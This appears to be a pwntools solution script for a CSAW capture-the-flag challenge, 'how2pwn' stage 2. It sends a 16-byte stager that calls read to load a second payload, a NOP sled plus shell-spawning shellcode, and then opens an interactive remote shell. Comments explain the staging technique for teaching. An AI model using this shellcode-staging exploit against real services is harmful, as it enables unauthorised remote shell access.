# Ticket
#764fce03d863b5155db4af260374acc1

from pwn import *

#context.log_level = 'debug'

p = remote("how2pwn.chal.csaw.io","60002")
#p = process("./chal2")
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# For this challenge, your task is to get a shell with shorter shellcode: 0x10 bytes

# Tip 1: Some register have the correct values before running our shellcode! Let's use gdb to check these registers!

# Tip 2: The 0x10 bytes length limitation is too strict for execve("/bin/sh") cuz len("/bin/sh")==0x8. \
# Why don't we call read rather than execve \
# so we could read longer shellcode and execute "/bin/sh" 

context.arch = 'amd64'

shellcode = shellcraft.read(0,'rdx',0xf0)

#gdb.attach(p)

p.send(b'764fce03d863b5155db4af260374acc1')


shellcode = asm(shellcode)
print(len(shellcode))

p.sendafter(": \n",shellcode.ljust(0x10,b'\0'))

sc = b"\x90"*len(shellcode)+asm(shellcraft.sh())
p.send(sc)

# If you sent proper shellcode which allows us to read longer shellcode, 
# you can try the following code. It's an easier way to generate shellcode
# p.send(b"\x90"*len(shellcode)+asm(shellcraft.sh()))

p.interactive()
